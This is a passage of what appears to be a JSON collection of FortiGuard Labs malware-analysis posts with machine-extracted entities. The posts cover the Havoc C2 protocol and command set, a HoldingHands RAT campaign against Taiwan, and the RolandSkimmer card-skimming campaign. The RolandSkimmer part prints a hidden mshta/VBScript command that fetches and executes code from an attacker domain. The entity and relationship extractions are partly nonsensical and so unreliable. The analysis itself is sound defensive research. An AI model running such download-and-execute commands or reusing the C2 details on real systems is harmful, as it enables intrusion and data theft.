our analysis. To proceed with our analysis, we set up a simulated Command and Control (C2) server. We modified the protocol from HTTPS to HTTP, allowing the traffic to be captured and analyzed in plaintext without TLS encryption. As long as the Havoc demon is running on the compromised device, it collects metadata about both the compromised Windows system and the Havoc process itself. This metadata is encrypted using the AES algorithm and then sent to the C2 server to register the compromised system on the C2 server. As shown at the bottom of Figure 5, the collected metadata includes various system and process details. The metadata (size:0xBA) contains, but is not limited to, the following information: the agent ID (0x67C54600), Demon ID (0x0F), Host name, User name, Doman, IP address, process name (“C:\\Windows\\SYSTEM32\\cmd.exe”), process ID (0x1ED4), parent PID (0x2444), the process’s load base address, OS version information, OS architecture, and more. Figure 6 shows a demon-init packet containing the AES-encrypted metadata mentioned earlier. This packet must be sent as the first packet to the C2 server to register the victim’s system. We have divided the packet into color-coded sections and broken it down in the table below to explain the contents of each part. Offset Comments +00h The data size, 0xFA. +04h Magic value, 0xDEADBEEF. +08h Agent ID, 0x67C54600. +0Ch Command ID, 0x63. DEMON_INIT. +10h Request ID, 0x0. +14h AES Key, 20h bytes. +34h AES IV, 10h bytes. +44h The AES encrypted metadata. The demon-init packet is sent as the body of an HTTP POST request. When the C2 server receives the packet, it verifies the magic value and decrypts the metadata using the AES key and AES IV included in the packet to complete the registration process. Meanwhile, the demon appears on the client dashboard with the compromised system metadata, just as illustrated in Figure 4. Figure 7 shows a Wireshark screenshot capturing a demon-init packet sent via an HTTP Post request. Havoc defines a wide range of control commands to control the compromised system, listed below: COMMAND_GET_JOB(0x1) COMMAND_INLINEEXECUTE_EXCEPTION(0x1) COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND(0x2) COMMAND_INLINEEXECUTE_RAN_OK(0x3) COMMAND_INLINEEXECUTE_COULD_NO_RUN(0x4) COMMAND_INLINEEXECUTE(0x14) COMMAND_NOJOB(0xA) COMMAND_SLEEP(0xB) COMMAND_PROC_LIST(0xC) COMMAND_FS(0xF) COMMAND_JOB(0x15) COMMAND_INJECT_DLL(0x16) COMMAND_INJECT_SHELLCODE(0x18) COMMAND_SPAWNDLL(0x1A) COMMAND_PROC_PPIDSPOOF(0x1B) CALLBACK_OUTPUT(0x0) CALLBACK_FILE(0x2) CALLBACK_FILE_WRITE(0x8) CALLBACK_FILE_CLOSE(0x9) CALLBACK_ERROR(0xD) CALLBACK_OUTPUT_OEM(0x1E) CALLBACK_OUTPUT_UTF8(0x20) DEMON_INIT(0x63) DEMON_INFO(0x59) BEACON_OUTPUT(0x5E) COMMAND_TOKEN(0x28) COMMAND_OUTPUT(0x5A) COMMAND_ERROR(0x5B) COMMAND_EXIT(0x5C) COMMAND_KILL_DATE(0x5D) COMMAND_CHECKIN(0x64) COMMAND_EXCEPTION(0x98) COMMAND_SYMBOL_NOT_FOUND(0x99) COMMAND_NET(0x834) COMMAND_CONFIG(0x9C4) COMMAND_SCREENSHOT(0x9CE) COMMAND_PIVOT(0x9D8) COMMAND_TRANSFER(0x9E2) COMMAND_SOCKET(0x9EC) COMMAND_KERBEROS(0x9F6) COMMAND_MEM_FILE(0xA00) COMMAND_PACKAGE_DROPPED(0xA0A) COMMAND_PROC(0x1010) COMMAND_PS_IMPORT(0x1011) COMMAND_ASSEMBLY_INLINE_EXECUTE(0x2001) COMMAND_ASSEMBLY_LIST_VERSIONS(0x2003) Most of the commands come with sub-commands to extend their capabilities. For example, theCOMMAND_FS(0xF)has 10 sub-commands: DEMON_COMMAND_FS_DIR(1) DEMON_COMMAND_FS_DOWNLOAD(2) DEMON_COMMAND_FS_UPLOAD(3) DEMON_COMMAND_FS_CD(4) DEMON_COMMAND_FS_REMOVE(5) DEMON_COMMAND_FS_MKDIR(6) DEMON_COMMAND_FS_COPY(7) DEMON_COMMAND_FS_MOVE(8) DEMON_COMMAND_FS_GET_PWD(9) DEMON_COMMAND_FS_CAT(10) Suppose the attacker needs to create a folder named “test” on the compromised system. The packet shown in Figure 8 can be observed: 0x0F is the command ID for DEMON_COMMAND_FS, and 0xA18D02EC is the request ID. The following value indicates the size of the encrypted sub-command and parameters. Within the decrypted sub-command data, 0x06 is the ID for DEMON_COMMAND_FS_MKDIR, and the subsequent data represents the folder name (size + data). In addition to the command and subcommand approach, Havoc also supports the in-memory execution of object files, commonly known as BOFs (Beacon Object Files). The C2 server sends a compiled Object File containing a piece of binary shellcode, which is executed directly in the memory of the demon process on the compromised system. Using BOFs allows Havoc to extend its functionality without replacing or updating the demon itself. Figure 8 shows a recently decrypted object file carried in a packet for the COMMAND_MEM_FILE command (command ID: 0xA00). The packet was sent when we typed “enum_filter_driver” in the client UI. In addition to the control commands, sub-commands, and BOFs introduced earlier, Havoc also implements a wide range of features. These features are categorized into two types: command and module, with each module containing multiple commands. Once we type a command name or a module name followed by its command name, the C2 server generates a command packet with the corresponding command ID and sub-command ID or BOF, which is then sent to the demon to control the compromised system. All the features of Havoc are listed in the table below. Command Name Type Description adcs_enum Command Enumerate CAs and templates in the AD. adcs_request Command Request an enrollment certificate. adduser Command Add a new user to a machine. addusertogroup Command Add a user to the specified group. arp Command Lists out ARP table. bofbelt Command A Seatbelt port using BOFs (Beacon Object Files). cacls Command List user permissions for the specified file. cat Command Display content of the specified file. cd Command Change to a specified directory. checkin Command Request a checkin request. config Module Configure the behavior of the demon session. cp Command Copy file. dcenum Command Enumerate domain information. dir Command List directory. dll Module DLL spawn and injection modules. domainenum Command Lists users accounts in the current domain. dotnet Module Execute and manage dotnet assemblies. download Command Downloads a specified file. driversigs Command Checks drivers for known EDR vendor names. enableuser Command Activates the specified user account. enum_filter_driver Command Enumerate filter drivers. enumlocalsessions Command Enumerate currently attached user sessions. env Command Print environment variables. exit Command Cleanup and exit. get-asrep Command Enumerate a given domain for user accounts with ASREP. get-delegation Command Enumerate a given domain for different types of abusable Kerberos Delegation settings. get-netsession Command Enumerate sessions on the remote device. get-spns Command Enumerate a given domain for user accounts with SPNs. get_password_policy Command Gets a server's configured password policy. help Command Shows help message of specified command. inline-execute Command Executes an object file. ipconfig Command Display network configuration settings . job Module Job manager. jump-exec Module Lateral movement module. kerberoast Command Perform Kerberoasting against specified SPN. klist Command List Kerberos tickets. ldapsearch Command Execute LDAP searches. listdns Command Obtains DNS cache entries. locale Command Prints the locale information of the server. luid Command Get current logon ID. mkdir Command Create new directory. mv Command Move a file or folder. nanodump Command Dump the LSASS process. nanodump_ppl_dump Command Bypass PPL and dump LSASS. nanodump_ppl_medic Command Bypass PPL and dump LSASS. nanodump_ssp Command Load a Security Support Provider (SSP) into LSASS. net Module Network and host enumeration module. netGroupList Command List groups. netGroupListMembers Command List group members. netLclGrpLstMmbrs Command List local group members. netLocalGroupList Command List local group. netshares Command List shared folders. netsharesAdmin Command List details of the shared folders. netstat Command List listening and connected network connections. netuptime Command Obtains the boot time information. netuser Command Get information about specific user. netview Command Lists the workstations and servers. noconsolation Command Execute a PE inline. nslookup Command Make a DNS query on the compromised device . pivot Module Pivoting module. powerpick Command Executes unmanaged powershell commands. powershell Command Executes powershell.exe commands. proc Module Process enumeration and management. ptt Command Import Kerberos ticket into a logon session. purge Command Purge a Kerberos ticket. pwd Command Get current directory. quser Command Simple implementation of quser.exe. reg_delete Command Deletes the registry key or value. reg_query Command Query a registry value or enumerate a single key. reg_query_recursive Command Recursively enumerate a key. reg_save Command Saves the registry path and all subkeys to a file. reg_set Command Creates or sets the specified key or value. remove Command Remove file or directory. resources Command List information of memory and disk drive. routeprint Command Prints route information. rportfwd Module Reverse port forwarding. samdump Command Dumps the SAM, SECURITY and SYSTEM registries to files. sc_create Command Creates a service on the target device. sc_delete Command Deletes the specified service. sc_description Command Sets the description of an existing service. sc_enum Command Enumerate services. sc_qc Command Queries a service with name in BOF (Beacon Object Files). sc_qdescription Command Queries a services description sc_qfailure Command Query a service for failure conditions. sc_qtriggerinfo Command Query a service for trigger conditions. sc_query Command Query services in BOF (Beacon Object Files). sc_start Command Starts a specified service. sc_stop Command Stops a specified service. schtasksenum Command Enumerate scheduled tasks. schtasksquery Command Query the given task in scheduled tasks. screenshot Command Takes a screenshot. sessions Command Get logon sessions. setuserpass Command Sets the password to a specified user account. shell Command Executes Windows commands in cmd.exe. shellcode Module Shellcode injection techniques. sleep Command Sets the delay to sleep. socks Module Manages socks5 proxy. task Module Task manager. tasklist Command List running processes on the remote device. tgtdeleg Command Retrieve a usable TGT for the current user. token Module Token manipulation and impersonation. transfer Command Download transfer module. upload Command Uploads a file. uptime Command Lists system boot time. userenum Command Lists user accounts. whoami Command Get the login user information in BOF (Beacon Object Files). windowlist Command List visible windows, like program windows’ title. wmi_query Command Run a wmi query and display results in CSV format. Here is how a control command is packaged into a packet. Acting as an attacker, we entered the “pwd” command inside the Havoc C2 server and sent it to the demon, which then displayed the command result on our screen. Typically, once the demon has connected to the C2 server, it sends a heartbeat packet to the C2 server approximately every 3 seconds (a random number) to notify the C2 server that the demon is still alive. The heartbeat packet structure is shown in Figure 10. Figure 10 also shows the command packet for the “pwd” command generated by the C2 server at the bottom. The control command data is sent within the response to the heartbeat packet. The command packet begins with a command ID (0x0F for COMMAND_FS), followed by a request ID (0xc5312b04), the size of the encrypted data, and then the encrypted data itself. The encrypted data, “51 7c 66 9c,” decrypts to “00 00 00 09,” which is the sub-command ID 0x9 (for DEMON_COMMAND_FS_GET_PWD) under the command ID 0x0F (COMMAND_FS). This analysis provides a detailed examination of a Havoc variant involved in a long-term cyber intrusion targeting critical national infrastructure in the Middle East. It demonstrates how this remote injector leverages a disguised conhost.exe process to deploy the Havoc payload into a newly created cmd.exe process. The Havoc framework’s modular design, supporting commands, sub-commands, and in-memory execution of Beacon Object Files (BOFs), offers attackers a flexible method to control the remote demon process. Overall, understanding the packet structures, encryption mechanisms, and command execution workflows will help researchers detect and analyze this sophisticated RAT framework. Fortinet customers are already protected from this malware with AntiVirus service, FortiGuard’s Anti-Botnet service, FortiGuard’s AntiSPAM service, and FortiGuard’s Web Filtering service as follows: TheFortiGuard’s Anti-Botnet serviceblocks the DNS requests for the C2 server domain. The domain to the C2 server is rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiGuard Antivirus servicedetects the remote injector and the encrypted Havoc DLL file with the following AV signatures. W64/Havoc.d16b!trData/Havoc.e5b0!tr FortiGuard IPS servicedetects Havoc traffic with the signature “Backdoor.Havoc.Agent”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. apps[.]gist[.]githubapp[.]net [conhost.exe / the remote injector]22BD09FBAB54963D4B0234585D33571A47A2DF569DBAB8B40988415AB0A3C37B[conhost.dll / encrypted Havoc sample with shellcode]9208034AF160357C99B45564FF54570B1510BAF3BC033999AE4281482617FF5B FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Intrusion into Middle East Critical National Infrastructure, Threat Type), (Windows, Platform), (Windows Users, Target), (High, Severity Level), (FGIR, Attacker), (DLL, File), (cmd.exe, File), (conhost.exe, Tool), (Middle East, Location), (CNI, Threat Type), (Global Threat Landscape Report, Document), (Havoc, Malware), (post-exploitation, Technique), (C2, Threat Type), (conhost.exe, Tool), (cmd.exe, File), (Windows System, Host), (Windows, Platform), (Windows Users, Target), (Remote Injector, Tool), (conhost.dll, File), (cmd.exe, File), (Middle East, Location), (CNI, Threat Type), (FGIR, Attacker)\nRelationships: (FortiGuard Labs Threat Research, followsUp, Intrusion into Middle East Critical National Infrastructure), (Intrusion into Middle East Critical National Infrastructure, leadsTo, Global Threat Landscape Report), (Intrusion into Middle East Critical National Infrastructure, affectedBy, Windows), (Intrusion into Middle East Critical National Infrastructure, impactedBy, Windows Users), (Intrusion into Middle East Critical National Infrastructure, severityLevel, High), (FGIR, uses, DLL), (FGIR, uses, cmd.exe), (FGIR, uses, conhost.exe),",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Intrusion into Middle East Critical National Infrastructure",
          "Threat Type"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "Windows Users",
          "Target"
        ],
        [
          "High",
          "Severity Level"
        ],
        [
          "FGIR",
          "Attacker"
        ],
        [
          "DLL",
          "File"
        ],
        [
          "cmd.exe",
          "File"
        ],
        [
          "conhost.exe",
          "Tool"
        ],
        [
          "Middle East",
          "Location"
        ],
        [
          "CNI",
          "Threat Type"
        ],
        [
          "Global Threat Landscape Report",
          "Document"
        ],
        [
          "Havoc",
          "Malware"
        ],
        [
          "post-exploitation",
          "Technique"
        ],
        [
          "C2",
          "Threat Type"
        ],
        [
          "conhost.exe",
          "Tool"
        ],
        [
          "cmd.exe",
          "File"
        ],
        [
          "Windows System",
          "Host"
        ],
        [
          "Windows",
          "Platform"
        ],
        [
          "Windows Users",
          "Target"
        ],
        [
          "Remote Injector",
          "Tool"
        ],
        [
          "conhost.dll",
          "File"
        ],
        [
          "cmd.exe",
          "File"
        ],
        [
          "Middle East",
          "Location"
        ],
        [
          "CNI",
          "Threat Type"
        ],
        [
          "FGIR",
          "Attacker"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "followsUp",
          "Intrusion into Middle East Critical National Infrastructure"
        ],
        [
          "Intrusion into Middle East Critical National Infrastructure",
          "leadsTo",
          "Global Threat Landscape Report"
        ],
        [
          "Intrusion into Middle East Critical National Infrastructure",
          "affectedBy",
          "Windows"
        ],
        [
          "Intrusion into Middle East Critical National Infrastructure",
          "impactedBy",
          "Windows Users"
        ],
        [
          "Intrusion into Middle East Critical National Infrastructure",
          "severityLevel",
          "High"
        ],
        [
          "FGIR",
          "uses",
          "DLL"
        ],
        [
          "FGIR",
          "uses",
          "cmd.exe"
        ],
        [
          "FGIR",
          "uses",
          "conhost.exe"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 26,
    "relationship_count": 8
  },
  {
    "title": "Threat Group Targets Companies in Taiwan",
    "link": "https://www.fortinet.com/blog/threat-research/threat-group-targets-companies-in-taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High In January 2025, FortiGuard Labs observed an attack targeting users in Taiwan. The threat actor is spreading the malware known as winos 4.0 via an email masquerading as being from Taiwan's National Taxation Bureau. Through continued monitoring, we identified further malware samples associated with this campaign. Among the new samples, a phishing email was sent in March 2025 with an attachment that contained a link used in another attack campaign. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first link belongs to the domain twszz[.]xin, which follows a similar naming pattern to the campaign targeting users in Taiwan. The second link directs to an image file about tax inspection, while the HTML filename claims to include account statement details. This link enabled us to trace the attack and identify additional malware samples, along with further links. Figure 2 provides a simplified threat map. The files on the left side of Figure 2 are XLS files used in campaigns that took place in June 2024. Over the past few months, this threat group has deployed malware based on the HoldingHands RAT (Remote Access Trojan), also known as Gh0stBins, to compromise users in Taiwan. The malware typically comprises multiple files embedded within a ZIP file and is distributed via phishing emails. Phishing emails typically masquerade as messages from the government or business partners, using topics such as taxes, pensions, invoices, and other subjects that prompt the recipient to immediately click on or open an attachment. Sometimes, the email content can be a picture with a hyperlink that asks the recipient to click on it, inadvertently downloading the malware. The attached PDF file uses content related to the phishing email to trick the recipient into opening the link. In newer attack chains, the link leads to a download page. The malware download page looks much simpler than the PDF file and email. It only contains text and a download button. In some attack chains, the malware is embedded in a password-protected ZIP file, and the password is on the download page. This prevents analysts who get the ZIP file but don't have access to the download page from opening it. Multiple files are used during the attack, including legitimate executable files and necessary DLL files, encrypted shellcode, and shellcode loaders. The shellcode loaders, which decrypt and execute the encrypted shellcode, are DLL files loaded by a legitimate executable via side-loading. Figure 8 shows an example of the files embedded in the ZIP file and the execution flow.條例檔案is the legitimate executable file used to loaddokan2.dllvia side-loading. In addition to the main execution flow, encrypted shellcodes support persistence, and empty files provide unique filenames. Although the ZIP files downloaded from different PDF files and webpages may have varying folder structures and files, their execution flows are similar to those shown in Figure 8. Sometimes, the ZIP file only contains an executable that drops the duplicate files observed in other chains. According to the image debug directory of the executable file, the malware is based on the HoldingHands Remote Access Trojan (RAT). Over the past two months, the ZIP file has included a text file containing the passwords for other files in the ZIP file, which makes detection more difficult. Dokan2.dll creates a thread to decrypt data indxpi.txtand execute it. Before this, it calls theShowWindowfunction to hide the executable's window for side-loading. It then searches forkernel32.dllandDwhsOqnbdrr.dllby comparing the lengths of the filenames of the files extracted from the ZIP file. DwhsOqnbdrr.dllis an empty file. By shifting each letter in the filename “DwhsOqnbdrr”forward one position in the alphabet, it becomesExitProcessand loads the function from thekernel32.dllit just found. It replaces the address of theExitProcessfunction in the import table with the address of a function that calls theWaitForSingleObjectfunction to wait for a signal from the thread that decryptsdxpi.txt. When the thread finishes, it calls theExitProcessfunction that it just loaded. In the thread, it executesthe條例檔案as an administrator if it doesn’t have high enough privileges. Then it searches forcollalautriv.xmland converts the filename to getVirtualAlloc, the API used in decryption. dxpi.txtexecutes initial setups for the next stage, including anti-VM, privilege escalation, and installation. Subkey: SOFTWARE\\MsUpTas Value name: State Value: 1 In addition, it drops other files extracted from the ZIP file to C:\\Program Files (x86)\\WindowsPowerShell\\Update. Original filename After Filename of dropped file Description bkproc.dll TaskServer.exe The same file as the條例檔案. code.dll code.bin It’s copied as System32\\msvchost.dat. Db.dll msgDb.dat The malicious payload. Shellcode based on HoldingHands. Doport.dll dokan2.dll Shellcode loader formsgDb.dat. EGLProtect.dll libEGL.dll The legitimate DLL file for條例檔案. fig32.dll config32.bin Unused. It renames the legitimateversion.dllasconfVersion.dlland writes the decrypted data ofconfig32.binto SysWOW64\\version.dllif it’s used. fig64.dll config64.bin It renames the legitimateTimeBrokerClient.dllasBrokerClientCallback.dlland writes the decrypted data ofconfig64.bintoTimeBrokerClient.dll. simg32.dll simg64.dll Binary file that is used bymsvchost.dat. In addition, it terminates ifBrokerClientCallback.dllandBlend.dllare present, indicating that the computer is infected.Blend.dllis thelegitimatemsimg32.dllthat is later renamed bymsvchost.dat. After installation, it executesTaskServer.exe, which loadsdokan2.dllvia side-loading. Dokan2.dllthendecrypts and executes the shellcode inmsgDb.datfor the next stage. Original Filename Filename of dropped file Description msgDb.dat system.dat, mymsc.nls The malicious payload. dokan2.dll dokan2.dll Shellcode loader formsgDb.dat. libEGL.dll libEGL.dll The legitimate DLL file for條例檔案. TaskServer.exe taskyhost.exe The same file as the條例檔案. simg64.dll msimg32.dll Shellcode loader forsystem.dat. MsgDb.datimplements C2 tasks for setting registry keys, data collection, and module download from the HoldingHands RAT. It also sends heartbeat packets to ensure the connection is active. Below is the packet's data structure, excluding the header. The packets frommsgDb.datand the C2 server follow this structure. 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 Magic Data size Unused Command 1 Payload(optional) ⁞ ⁞ Magic: 0xDEADBEEFData size: The size of the command and the payload The first outgoing packet doesn’t contain a payload. TheKNELcommand indicates that the packet is from a kernel module. As a response, the C2 server sends a data collection request. After sending the user information,msgDb.datsends heartbeat packets and waits for further instructions. The response command is 0x00. To get the install date, it reads theInstallDatevalue from the SOFTWARE\\HHClient registry key. If this is the first time the C2 server queries for this information, it writes the current time to the value. The registry values set by other commands areCommentandGroupfrom the SOFTWARE\\HHClient registry key. If theCommentvalue is not set, it writesdefaultto the packet. Once all data is downloaded,msgDb.datexecutes the module. Otherwise, it sends 0x0B to ask for more data. During our analysis, we identified three modules delivered by the C2 server, including two remote desktop modules and a file manager.msgDb.datcalls the only export function, ModuleEntry, to proceed to the next stage of the attack. Below are the commands in the initial packet: Module name Command Description rd RDTP Remote desktop rd_dxgi RDTP Remote desktop filemgr FMGR File manager The packets follow the same structure asmsgDb.dat. The modules' image debug directories indicate that they also belong to the HoldingHands RAT. Some modules appear to be simplified versions, as indicated by the term 'jingjianban' (meaning 'lite version' in Chinese) in the Image Debug Directory. In addition towinos, which we covered in February 2025, and HoldingHands, discussed in this article, this threat group frequently employs Gh0stCringe. Figures 5 through 7 include screenshots of files in this attack chain. This analysis revealed further malware samples associated with the attack that began targeting Taiwan in January 2025. The attack chain comprises numerous snippets of shellcode and loaders, making the attack flow complex. However, the purpose of these samples is to execute a malicious payload that accesses a C2 server to receive further instructions. Across winos, HoldingHands, and Gh0stCring, this threat group continuously evolves its malware and distribution strategies. FortiGuard will continue to monitor these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent.A6DC!tr.dldrW64/ShellcodeRunner.ARG!trW64/Agent.FIN!trW64/HHAgent.BEE8!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have installed the latest updates for these products are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm malicious macros in documents. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 154[.]91[.]85[.]204154[.]86[.]22[.]47156[.]251[.]17[.]17206[.]238[.]179[.]173206[.]238[.]220[.]60206[.]238[.]199[.]22154[.]91[.]85[.]201206[.]238[.]221[.]182206[.]238[.]196[.]32154[.]91[.]64[.]45206[.]238[.]115[.]207156[.]251[.]17[.]12107[.]149[.]253[.]183 00-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]com6-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfte-1340224852[.]cos[.]ap-guangzhou[.]myqcloud[.]comcq1tw[.]toptwcz[.]protwczb[.]comtwnc[.]inktwnic[.]icutwnic[.]inktwnic[.]ltdtwnic[.]xintwsa[.]toptwsw[.]cctwsw[.]clubtwsw[.]infotwsw[.]inktwsw[.]ltdtwsw[.]protwsww[.]viptwsww[.]xintwswz[.]toptwswzz[.]xintwtgtw[.]nettwzfw[.]vip 6558dfb070421c674b377a0a6090593fa0c44d5b0dec5325a648583f92175ce2d3a270d782e62574983b28bd35076b569a0b65236e7f841a63b0558f2e3a231ca8430ce490d5c5fab1521f3297e2d277ee7e7c49e7357c208878f7fd5f7639317d3f352ded285118e916336da6e6182778a54dc88d4fb7353136f028ac9b81e0143f434e3a2cac478fb672b77d6c04cdf25287d234a52ee157f4f1a2b06f8022c25e80cd10e7741b5f3e0b246822e0af5237026d5227842f6cf4907daa0398487263550339c2a35f356bb874fb3a619b76f2d602064beada75049e7c2927a6dc a8b6c06daeede6199e69f4cafd79299219def5bf913a31829dede98a8ad2aaa96fcd6aef0678d3c6d5f8c2cb660356b25f68c73e7ee24fbb721216a547d17ffaed72721837c991621639b4e86ffe0c2693ef1a545741b5513d204a1e3e008d8c65edd9e1a38fd3da79c8a556eb2c7c595125ffec9f7483e2e6e189a08cc5d4120a0375648bc9368bccfd3d657d26976d5b1f975381d1858d001404d807334058e809582faccdd27337aa46b4a11dd11f5d0c7d7428ebdc8c895ea80777e4da5f59d2433264d8ec9e9797918be3aa7132dbeb71e141f6e5c64c0d6f1cb4452934 ac957ba4796f06c4bf0c0afb8674bbeb30eb95cef85bc68ced3ee1aa30e3acff9296adb71bc98140a59b19f68476d45dbb38cc60b9e263d07d14e7178f195989636c2ccffce7d4591b0d5708469070b839f221400b38189c734004641929ae0531ffa4e3638c9e094275051629cc3ac0a8c7d6ae8415bbfcacc4c605c7f0df39da3deea591b59b1a0f7e11db2f729a263439a05f3e8b0de97bbac99154297cea e2269b38655a4d75078362856c16594e195cd647c56b8c55883b8e1286baa65852632d9e24f42c4651cf8db3abc37845e693818d64ab0b11c235eddf8e011b2f7200155f3e30dbbd4c4c26ce2c7bd4878ab992b619d80b43c0bd9e17390082fce516b102a2a6001eafb055e42feb9000691e2353c7e87e34ddaa99d7d8af16fda9ddd4e4d54336ce110fdc769ff7c4940f8d89b45ee8dc24f56fc3ea00c18873a12d17cca038cdbf79b72356e5d20b17722c7b20bd2ee308601bac901890f3f4b1ac2178c90c8eafd8121d21acbae7a0eb0cbc156d4a5f692f44b28856a23481a6c1629b4450f713b02d24f088c4f26b0416c6a7924dcf0477425f3a67a2e3ff3ce81c163ddedb132116cdf92aae197ced0b94f3fc3d1036f5c41b084a256a03a19fdfc131e8fbe063289c83a3cdefb9fb9fb6f1f92c83b892d3519a381623dbdb15f45f69f863510986fb2198a8a6b3d55d8ccc8a2ed4bb30bc27bdd1bf151cbf1a7938f61a9905e1b151c7a5f925a2ce3870b7c3e80f6e0fc07715bdc258b7f42c6949c6d8ecf648bacca08cde568f11ec2663221a97dae5fbf01218e8775a FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (winos 4.0, Malware), (Taiwan, Country), (twszz[.]xin, Domain), (Gh0stBins, Malware), (holdinghands rat, Threat Type), (tax inspection, Technique), (account statement details, File), (gh0stbins, Malware)\nRelationships: (FortiGuard Labs, affectedPlatforms, Microsoft Windows), (winos 4.0, uses, malware), (Taiwan, impactedUsers, Microsoft Windows), (twszz[.]xin, resolvesTo, twszz[.]xin), (Gh0stBins, associatedWith, holdinghands rat), (holdinghands rat, targets, Microsoft Windows), (tax inspection, usedBy, Gh0stBins), (account statement details, contains, Gh0stBins)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "winos 4.0",
          "Malware"
        ],
        [
          "Taiwan",
          "Country"
        ],
        [
          "twszz[.]xin",
          "Domain"
        ],
        [
          "Gh0stBins",
          "Malware"
        ],
        [
          "holdinghands rat",
          "Threat Type"
        ],
        [
          "tax inspection",
          "Technique"
        ],
        [
          "account statement details",
          "File"
        ],
        [
          "gh0stbins",
          "Malware"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "affectedPlatforms",
          "Microsoft Windows"
        ],
        [
          "winos 4.0",
          "uses",
          "malware"
        ],
        [
          "Taiwan",
          "impactedUsers",
          "Microsoft Windows"
        ],
        [
          "twszz[.]xin",
          "resolvesTo",
          "twszz[.]xin"
        ],
        [
          "Gh0stBins",
          "associatedWith",
          "holdinghands rat"
        ],
        [
          "holdinghands rat",
          "targets",
          "Microsoft Windows"
        ],
        [
          "tax inspection",
          "usedBy",
          "Gh0stBins"
        ],
        [
          "account statement details",
          "contains",
          "Gh0stBins"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 8
  },
  {
    "title": "RolandSkimmer: Silent Credit Card Thief Uncovered",
    "link": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High Web-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection. The attacker first spreads a malicious ZIP file named “faktura_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura_1065170.lnk.” This shortcut covertly executes the following hidden command: C:\\WiNDOws\\SYsTEM32\\MShTA.exe vbscript:execute(\"SeT mi1=CReATeobjECt(\\\"msxmL2.SErverXMlHTtp.6.0\\\"):mi1.OpEN \\\"geT\\\",\\\"Hxxp://iNVsetmX[.]cOM/ipa.AsPX\\\",faLSe:mi1.SEnD():rANdOMize:R=INt(rnD*99999):ExECute(REpLAce(mI1.REsponSEtEXt,\\\"#\\\", R)):\")(wiNDoW.ClosE) The page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands. Below is a network traffic example showing both the regular communication and the encoded commands received from the server. The encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts. First, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path. It then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments. To target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of 